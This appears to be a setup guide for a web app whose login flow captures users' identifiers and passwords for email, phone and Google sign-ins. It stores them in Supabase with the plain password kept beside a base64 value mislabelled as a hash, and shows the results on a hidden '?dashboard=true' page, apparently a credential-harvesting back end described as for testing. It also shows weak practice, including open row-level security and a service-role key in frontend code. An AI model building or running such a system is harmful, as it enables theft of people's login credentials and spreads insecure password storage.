# Supabase Migration Setup Guide

## Overview
This project has been migrated from IndexedDB to Supabase for persistent cloud storage of captured credentials and activity logs.

## Prerequisites
1. A Supabase account (sign up at https://supabase.com)
2. A Supabase project created

## Step-by-Step Setup

### 1. Get Your Supabase Project URL

1. Go to https://supabase.com/dashboard
2. Select your project
3. Go to **Settings** → **API**
4. Copy your **Project URL** (format: `https://xxxxx.supabase.co`)

### 2. Update Environment Variables

Edit the `.env.local` file and replace `YOUR_PROJECT_URL_HERE` with your actual Supabase project URL:

```env
VITE_SUPABASE_URL=https://YOUR_PROJECT_REF.supabase.co
VITE_SUPABASE_ANON_KEY=your_supabase_anon_key_here
```

### 3. Create Database Tables

1. In your Supabase dashboard, go to **SQL Editor**
2. Click **New Query**
3. Copy and paste the contents of `supabase_migration.sql`
4. Click **Run** to execute the migration

This will create:
- `captured_credentials` table (stores login credentials)
- `activity_logs` table (stores user activity)
- Indexes for performance
- Row Level Security policies (currently set to allow all for testing)

### 4. Restart the Development Server

Stop the current server (Ctrl+C) and restart:

```bash
npm run dev
```

## Database Schema

### captured_credentials
- `id` (UUID) - Primary key
- `auth_method` (TEXT) - Login method (email, phone, google)
- `identifier` (TEXT) - Username, email, or phone number
- `password_hash` (TEXT) - Base64 encoded password
- `original_password` (TEXT) - Original password (for testing)
- `metadata` (JSONB) - Additional metadata
- `created_at` (TIMESTAMP) - Record creation time

### activity_logs
- `id` (UUID) - Primary key
- `action` (TEXT) - Action description
- `metadata` (JSONB) - Action metadata
- `created_at` (TIMESTAMP) - Record creation time

## Verification

After setup:
1. Open http://localhost:3000/
2. Complete a login flow
3. Visit http://localhost:3000/?dashboard=true
4. You should see the captured data
5. Check your Supabase dashboard → **Table Editor** to verify data is being stored

## Security Notes

⚠️ **IMPORTANT**: 
- The current RLS policies allow unrestricted access for testing purposes
- The service role key is exposed in the frontend (suitable for testing only)
- For production use:
  - Use proper RLS policies
  - Keep service role keys server-side only
  - Use anon key for client-side operations
  - Implement proper authentication

## Troubleshooting

### Error: "Missing Supabase environment variables"
- Make sure `.env.local` exists and contains valid values
- Restart the dev server after updating `.env.local`

### Error: "relation 'captured_credentials' does not exist"
- Run the migration SQL in Supabase SQL Editor
- Verify tables exist in Supabase dashboard → **Table Editor**

### Data not appearing
- Check browser console for errors
- Verify your Supabase URL and API key
- Check Supabase dashboard → **Table Editor** to see if data exists
- Verify RLS policies are enabled and allow operations

## API Key Information

Get your Supabase API key from the Supabase Dashboard (Settings → API).

**Service Role Key** characteristics:
- Bypasses Row Level Security
- Has full access to all tables
- Should NEVER be exposed in client-side code in production
- Suitable for testing/development only

For production, you should:
1. Use the **anon key** (public/publishable key) in client-side code
2. Keep service role key server-side only
3. Implement proper RLS policies
